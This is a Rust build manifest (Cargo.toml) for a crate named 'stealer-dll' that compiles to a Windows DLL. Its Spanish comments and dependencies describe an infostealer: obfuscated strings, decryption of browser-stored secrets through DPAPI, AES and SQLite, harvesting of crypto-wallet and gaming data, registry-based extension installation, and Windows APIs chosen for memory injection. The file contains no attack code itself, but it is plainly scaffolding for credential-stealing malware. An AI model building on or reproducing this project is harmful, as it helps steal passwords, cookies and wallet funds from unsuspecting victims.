[package]
name = "stealer-dll"
version = "2.0.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]  # Compile as dynamic library (DLL)
name = "stealer"

[dependencies]
# Ofuscación de strings (mantener para defensa en profundidad)
obfstr = "0.4"

# Database access
rusqlite = { version = "0.31", features = ["bundled"] }

# Crypto (mismas versiones que agent)
aes-gcm = "0.10"
des = "0.8"
cbc = "0.1"
block-padding = "0.3"
sha1 = "0.10"
pbkdf2 = { version = "0.12", features = ["hmac"] }
hmac = "0.12"
sha2 = "0.10"

# JSON parsing (para wallets/gaming)
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

# Windows Registry para instalación de extensión
winreg = "0.52"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "dpapi", 
    "wincrypt", 
    "errhandlingapi", 
    "processthreadsapi", 
    "psapi", 
    "winnt",
    # Features para memory injection
    "handleapi",
    "tlhelp32",
    "memoryapi",
    "libloaderapi"
] }
